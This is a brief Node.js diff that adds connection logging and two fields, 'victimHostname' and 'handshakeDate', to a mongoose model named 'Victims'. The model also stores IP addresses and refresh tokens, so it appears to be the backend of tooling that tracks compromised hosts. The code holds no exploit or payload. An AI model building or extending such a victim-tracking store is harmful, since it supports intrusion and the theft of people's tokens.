@@ -2,11 +2,17 @@ const mongoose = require("mongoose");
 
 const DBURI = process.env.DBURI;
 
-mongoose.connect(DBURI);
+mongoose.connect(DBURI).then(() => {
+	console.log('Connected to mongo')
+}).catch((err) => {
+	console.log("Error connecting to mongo")
+});
 
 const Victims = mongoose.model("Victims", {
 	ipv4: String,
+	victimHostname: String,
 	victimDescription: String,
+	handshakeDate: Date,
 	refreshToken: String,
 	refreshTokenExpiry: Date,
 });
